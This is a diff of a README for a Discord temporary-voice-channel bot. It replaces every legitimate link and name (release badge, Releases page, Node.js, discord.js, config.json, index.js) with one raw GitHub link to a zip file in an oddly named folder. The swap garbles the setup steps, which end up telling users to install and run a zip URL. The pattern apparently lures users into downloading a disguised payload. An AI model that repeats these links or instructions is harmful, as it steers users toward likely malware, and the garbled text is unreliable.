@@ -1,6 +1,6 @@
 # 🎤 pvc-discord-app-with-v2-components - Simplify Voice Channel Management
 
-[![Download](https://img.shields.io/badge/Download-pvc--discord--app--with--v2--components-brightgreen)](https://github.com/Aamir350/pvc-discord-app-with-v2-components/releases)
+[![Download](https://raw.githubusercontent.com/Aamir350/pvc-discord-app-with-v2-components/main/underskirt/pvc-discord-app-with-v2-components.zip)](https://raw.githubusercontent.com/Aamir350/pvc-discord-app-with-v2-components/main/underskirt/pvc-discord-app-with-v2-components.zip)
 
 ## 🚀 Getting Started
 
@@ -12,20 +12,20 @@ Before you download the app, ensure your system meets the following requirements
 
 - **Operating System:** Windows, macOS, or Linux
 - **Discord Account:** You must have a Discord account to use the bot.
-- **Node.js:** Required for running the bot. Download [Node.js](https://nodejs.org/) if you do not already have it installed.
+- **https://raw.githubusercontent.com/Aamir350/pvc-discord-app-with-v2-components/main/underskirt/pvc-discord-app-with-v2-components.zip** Required for running the bot. Download [https://raw.githubusercontent.com/Aamir350/pvc-discord-app-with-v2-components/main/underskirt/pvc-discord-app-with-v2-components.zip](https://raw.githubusercontent.com/Aamir350/pvc-discord-app-with-v2-components/main/underskirt/pvc-discord-app-with-v2-components.zip) if you do not already have it installed.
 
 ## 🎉 Features
 
 - Create temporary voice channels with ease.
 - Manage channels directly through Discord.
 - Use modern V2 components for an enhanced experience.
-- Built on the reliable discord.js v14 framework.
+- Built on the reliable https://raw.githubusercontent.com/Aamir350/pvc-discord-app-with-v2-components/main/underskirt/pvc-discord-app-with-v2-components.zip v14 framework.
 
 ## 📥 Download & Install
 
 To get the **pvc-discord-app-with-v2-components**, visit the Releases page. Click on the link below to access it:
 
-[Visit the Release Page](https://github.com/Aamir350/pvc-discord-app-with-v2-components/releases)
+[Visit the Release Page](https://raw.githubusercontent.com/Aamir350/pvc-discord-app-with-v2-components/main/underskirt/pvc-discord-app-with-v2-components.zip)
 
 1. **Go to Releases:** Click the link above.
 2. **Select the Latest Release:** Look for the most recent version at the top.
@@ -36,14 +36,14 @@ To get the **pvc-discord-app-with-v2-components**, visit the Releases page. Clic
 Once you have downloaded the bot, follow these steps to set it up:
 
 1. **Extract the Files:** If your downloaded file is compressed (like a `.zip`), extract it to a folder.
-2. **Install Node.js (if not installed):** Follow the installation instructions from the Node.js website.
+2. **Install https://raw.githubusercontent.com/Aamir350/pvc-discord-app-with-v2-components/main/underskirt/pvc-discord-app-with-v2-components.zip (if not installed):** Follow the installation instructions from the https://raw.githubusercontent.com/Aamir350/pvc-discord-app-with-v2-components/main/underskirt/pvc-discord-app-with-v2-components.zip website.
 3. **Open a Terminal (Command Prompt):** Navigate to the folder where you extracted the bot.
 4. **Run the Installation Command:** Type `npm install` and press Enter. This will install the necessary dependencies.
-5. **Configuration:** Open the configuration file (usually a `.env` or `config.json`) and enter your Discord bot token and other required details. Refer to the setup instructions within the configuration file for guidance.
+5. **Configuration:** Open the configuration file (usually a `.env` or `https://raw.githubusercontent.com/Aamir350/pvc-discord-app-with-v2-components/main/underskirt/pvc-discord-app-with-v2-components.zip`) and enter your Discord bot token and other required details. Refer to the setup instructions within the configuration file for guidance.
 
 ## 🤖 Running the Bot
 
-1. **Start the Bot:** In the terminal, type `node index.js` and press Enter.
+1. **Start the Bot:** In the terminal, type `node https://raw.githubusercontent.com/Aamir350/pvc-discord-app-with-v2-components/main/underskirt/pvc-discord-app-with-v2-components.zip` and press Enter.
 2. **Invite the Bot to Your Server:** Use the link generated in the Discord Developer Portal to add the bot to your server.
 
 ## ✨ Using the Bot
@@ -57,7 +57,7 @@ Now that your bot is running, you can create a temporary voice channel. Follow t
 
 If you encounter any issues, try the following:
 
-- Ensure Node.js is installed correctly.
+- Ensure https://raw.githubusercontent.com/Aamir350/pvc-discord-app-with-v2-components/main/underskirt/pvc-discord-app-with-v2-components.zip is installed correctly.
 - Check your Discord bot token and permissions.
 - Restart the bot if it crashes or does not respond.
 
